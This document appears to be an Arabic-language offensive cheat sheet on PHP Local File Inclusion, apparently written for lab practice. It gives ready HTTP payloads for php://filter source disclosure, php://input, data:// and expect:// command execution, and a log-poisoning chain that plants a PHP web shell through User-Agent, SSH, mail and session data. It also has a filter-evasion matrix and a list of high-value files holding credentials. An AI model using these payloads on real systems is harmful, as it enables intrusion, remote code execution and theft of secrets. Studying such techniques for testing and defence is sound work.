# Technical Reference & Deep Dive: File Inclusion (مرجع تقني معمق)

---

## 1. أغلفة بروتوكولات لغة PHP المتقدمة (PHP Stream Wrappers)

توفر لغة PHP ميزة "أغلفة التدفق" (Stream Wrappers) للوصول إلى مختلف مصادر البيانات. عند وجود ثغرة LFI، تتحول هذه الأغلفة إلى أسلحة هجومية استراتيجية للقراءة المتقدمة للكود المصدري أو تحقيق تنفيذ الأوامر عن بُعد:

### 1.1 غلاف الفلترة وقراءة الكود المصدري (`php://filter`)
* **المشكلة التي يحلها:** عند محاولة قراءة ملف PHP محلي (مثل `config.php`) عبر LFI، يقوم الخادم بتنفيذه بدلاً من عرضه، فترجع الصفحة فارغة.
* **الحل:** استخدام غلاف `php://filter` لتحويل الكود إلى ترميز Base64 قبل وصوله لمحرك التنفيذ:
  ```http
  GET /index.php?page=php://filter/convert.base64-encode/resource=config.php HTTP/1.1
  ```
* **النتيجة:** يُرجع الخادم سلسلة Base64 طويلة. بفك تشفيرها، يظهر الكود المصدري للسكربت متضمناً بيانات الاتصال بقاعدة البيانات ومفاتيح التشفير السرية!

### 1.2 غلاف إدخال البيانات المباشر (`php://input`)
* **الآلية:** يسمح بقراءة البيانات الخام المرسلة في جسم طلب POST وتنفيذها ككود PHP:
  ```http
  POST /index.php?page=php://input HTTP/1.1
  Host: target.thm
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 28

  <?php system('id; whoami'); ?>
  ```
* **الشرط:** يتطلب تفعيل `allow_url_include = On`.

### 1.3 غلاف البيانات النصية المباشرة (`data://`)
* **الآلية:** تمرير كود PHP مشفر أو نصي مباشرة في سطر الـ URL:
  ```http
  GET /index.php?page=data://text/plain,<?php system('uname -a'); ?> HTTP/1.1
  GET /index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg== HTTP/1.1
  ```
* **الشرط:** يتطلب تفعيل `allow_url_include = On`.

### 1.4 غلاف تنفيذ الأوامر (`expect://`)
* غلاف إضافي يتيح تنفيذ أوامر النظام مباشرة:
  ```http
  GET /index.php?page=expect://whoami HTTP/1.1
  ```
* نادراً ما يكون مفعلاً في الخوادم الافتراضية، ولكنه يمنح RCE فورياً إذا وجد.

---

## 2. تقنيات تسميم السجلات لتحقيق تنفيذ الأوامر (Log Poisoning to RCE)

عندما تتوفر ثغرة LFI ولكن `allow_url_include = Off` (مما يمنع RFI)، يلجأ المهاجم إلى تقنية **Log Poisoning**:
فكرة الهجوم: حقن كود PHP داخل ملف سجل خادم يمكن قراءته عبر ثغرة LFI، ثم تضمين ذلك السجل لتنفيذ الكود!

```
[Attacker Request with Poisoned Header]
GET / HTTP/1.1
User-Agent: <?php system($_GET['c']); ?>
       |
       v
[Target Web Server: Apache / Nginx]
Writes User-Agent into access log:
"/var/log/apache2/access.log"
       |
       v
[Attacker Triggers LFI on Access Log]
GET /index.php?page=../../../../var/log/apache2/access.log&c=id
       |
       v
[Target PHP Execution Engine]
Parses access.log -> Finds <?php system('id'); ?> -> Executes!
Returns: uid=33(www-data) gid=33(www-data)
```

### 2.1 أبرز مسارات السجلات القابلة للتسميم (Target Log Paths)
| الخدمة المستهدفة | مسار ملف السجل | طريقة الحقن المعتمدة |
| :--- | :--- | :--- |
| **Apache Access Log** | `/var/log/apache2/access.log` | حقن كود PHP في ترويسة `User-Agent` أو مسار الطلب. |
| **SSH Auth Log** | `/var/log/auth.log` | محاولة تسجيل دخول عبر SSH باسم مستخدم خبيث: `ssh '<?php system($_GET["c"]); ?>'@target.thm` |
| **Mail Logs** | `/var/log/mail.log` أو `/var/mail/www-data` | إرسال بريد إلكتروني داخلي يحتوي على كود PHP في جسم الرسالة. |
| **PHP Sessions** | `/var/lib/php/sessions/sess_<session_id>` | حقن كود PHP في قيمة كوكي جلسة مسجلة في المتصفح. |

---

## 3. مصفوفة تخطي الفلاتر التكتيكية (Evasion Matrix)

```
+------------------------------------+-----------------------------------------------+
| نوع الفلتر والتقييد                | أسلوب الالتفاف والتجاوز                       |
+------------------------------------+-----------------------------------------------+
| حظر تتابع ../ البسيط               | ....//....// (الحذف غير التكراري)             |
|                                    | ..\/..\/ (خلط الشرطات في أنظمة ويندوز)        |
+------------------------------------+-----------------------------------------------+
| فلاتر التشفير (URL Encoding)       | %2e%2e%2f (تشفير أحادي)                       |
|                                    | %252e%252e%252f (تشفير مزدوج Double Encoding) |
|                                    | %c0%ae%c0%ae%c0%af (ترميز 16-bit Unicode)    |
+------------------------------------+-----------------------------------------------+
| تقييد الامتداد (.php)              | /etc/passwd%00 (Null Byte في PHP < 5.3.4)    |
|                                    | /etc/passwd/ (النقطة في بعض بيئات POSIX)      |
|                                    | /etc/passwd/./././ (Path Truncation)          |
+------------------------------------+-----------------------------------------------+
| فرض مجلد محدد (images/)            | images/../../../../etc/passwd                 |
+------------------------------------+-----------------------------------------------+
```

---

## 4. قائمة الملفات الحساسة عالية القيمة (High-Value Target Files)

### 4.1 بيئات لينكس (Linux Environments)
* `/etc/passwd`: حسابات النظام وهياكل المسارات.
* `/etc/hosts`: أسماء النطاقات المحلية وعناوين الشبكة الداخلية.
* `/etc/crontab` و `/etc/cron.d/*`: المهام المجدولة (لاكتشاف مسارات تصعيد الصلاحيات).
* `/proc/self/environ`: متغيرات البيئة للعملية الحالية (قد تسرب مفاتيح سرية وكلمات مرور).
* `/proc/self/cmdline`: الأمر الكامل الذي أطلق العملية الحالية.
* `/proc/net/tcp` و `/proc/net/udp`: المنافذ المحلية المفتوحة المربوطة داخلياً (Localhost).
* `/var/www/html/wp-config.php` (في ووردبريس) أو `.env` (في لارافيل/نود): مفاتيح قواعد البيانات.

### 4.2 بيئات ويندوز (Windows Environments)
* `C:\Windows\win.ini`: ملف التكوين العام (أفضل إثبات أثر لويندوز).
* `C:\Windows\System32\drivers\etc\hosts`: ملف أسماء النطاقات المحلية.
* `C:\boot.ini` (في الأنظمة القديمة): تكوين إقلاع النظام.
* `C:\Windows\Panther\Unattend.xml`: ملفات التثبيت غير المراقب (غالباً ما تحتوي على كلمات مرور Administrator بنص صريح).
